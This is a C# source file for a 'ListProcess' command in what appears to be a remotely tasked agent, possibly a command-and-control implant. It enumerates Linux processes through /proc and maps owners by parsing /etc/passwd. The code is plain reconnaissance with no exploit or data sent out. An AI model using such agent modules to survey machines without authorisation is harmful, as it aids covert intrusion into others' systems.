using Shared;
using Shared.ResultObjects;
using System.Diagnostics;


namespace Agent.Commands
{


    public class ListProcessCommand : AgentCommand
    {
        public override CommandId Command => CommandId.ListProcess;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            var list = new List<ListProcessResult>();
            string filter = null;
            if (task.HasParameter(ParameterId.Path))
            {
                filter = task.GetParameter<string>(ParameterId.Path); ;
            }

            var processes = Process.GetProcesses();
            if (!string.IsNullOrEmpty(filter))
                processes = processes.Where(p => p.ProcessName.ToLower().Contains(filter.ToLower())).ToArray();

            foreach (var process in processes)
            {
                var res = new ListProcessResult()
                {
                    Name = process.ProcessName,
                    Id = process.Id,
                    ParentId = GetProcessParent(process),
                    SessionId = process.SessionId,
                    ProcessPath = GetProcessPath(process),
                    Owner = GetProcessOwner(process),
                    Arch = GetProcessArch(process),
                };

                list.Add(res);
            }

            context.Objects(list);
        }

        public static int GetProcessParent(Process process)
        {
            try
            {
                // Lit /proc/[pid]/stat
                var stat = File.ReadAllText($"/proc/{process.Id}/stat");
                // Format: pid (name) state ppid ...
                var parts = stat.Split(' ');
                return int.Parse(parts[3]); // PPID
            }
            catch { return 0; }
        }

        public static string GetProcessPath(Process process)
        {
            try
            {
                // .NET 6+ supporte DirectoryInfo.ResolveLinkTarget
                var link = new FileInfo($"/proc/{process.Id}/exe");
                var target = link.ResolveLinkTarget(true);
                return target?.FullName ?? string.Empty;
            }
            catch { return string.Empty; }
        }

        public static string GetProcessOwner(Process process)
        {
            try
            {
                // Lit /proc/[pid]/status
                var status = File.ReadAllLines($"/proc/{process.Id}/status");
                var uidLine = status.FirstOrDefault(l => l.StartsWith("Uid:"));
                if (uidLine == null) return string.Empty;

                var uid = uidLine.Split("\t", StringSplitOptions.RemoveEmptyEntries)[1];

                // Convertit UID -> username
                return GetUserFromUid(uid);
            }
            catch { return string.Empty; }
        }

        public static string GetProcessArch(Process process)
        {
            try
            {
                var exePath = GetProcessPath(process);
                if (string.IsNullOrEmpty(exePath)) return string.Empty;

                // Lit le header ELF
                using (var fs = File.OpenRead(exePath))
                {
                    var header = new byte[5];
                    fs.Read(header, 0, 5);

                    //header[4] : 1=32bit, 2=64bit
                    return header[4] switch
                    {
                        1 => "x86",
                        2 => "x64",
                        _ => "unknown"
                    };
                }
            }
            catch { return string.Empty; }
        }

        private static string GetUserFromUid(string uid)
        {
            try
            {
                // Parse /etc/passwd
                var lines = File.ReadAllLines("/etc/passwd");
                var entry = lines.FirstOrDefault(l => l.Split(':')[2] == uid);
                return entry?.Split(':')[0] ?? uid;
            }
            catch { return uid; }
        }


    }
}
